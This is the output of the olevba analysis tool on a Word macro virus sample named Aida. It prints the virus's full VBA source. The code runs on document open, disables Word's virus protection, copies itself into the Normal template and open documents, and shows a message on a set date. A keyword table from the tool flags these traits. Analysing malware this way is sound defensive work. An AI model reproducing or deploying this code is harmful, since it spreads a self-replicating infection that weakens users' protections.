olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Aida-54d623714f451873301da37b16dc5a450ec11395
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Aida-54d623714f451873301da37b16dc5a450ec11395 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Aida
Private Sub Document_Open(): With Options: Const nula = 0
.VirusProtection = nula
End With: Dim a, b, c, d
a = Strings.RTrim(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, _
ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines))
With NormalTemplate.VBProject.VBComponents(1).CodeModule
c = .Lines(1, 1)
If c <> "'Aida" Then
.DeleteLines 1, NormalTemplate.VBProject.VBComponents(1) _
.CodeModule.CountOfLines
.InsertLines 1, a
End If
End With
With ActiveDocument.VBProject.VBComponents(1).CodeModule
d = .Lines(1, 1)
If d <> "'Aida" Then
.DeleteLines 1, ActiveDocument.VBProject.VBComponents(1) _
.CodeModule.CountOfLines
.InsertLines 1, a
End If: End With
If Day(Now()) = 14 And Month(Now()) = 9 Then
With Selection
.Font.Bold = True: .Font.Color = wdColorViolet
.Font.Size = 26: .Font.Emboss = True
.Font.Animation = wdAnimationSparkleText
.Font.Shadow = True: .ParagraphFormat.Alignment = wdAlignParagraphCenter
Selection.Text = "Aida: Where ever You are, You are only one that I loved truely!"
End With
End If
'WM97/2K.Aida by e[ax]
'Pozdravljam sve pri BiHNet.Org-u!
'Greetz to all ppl on #virus and VX-scene!
'Kad sve izgleda da umire, ono se ustvari radja...
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

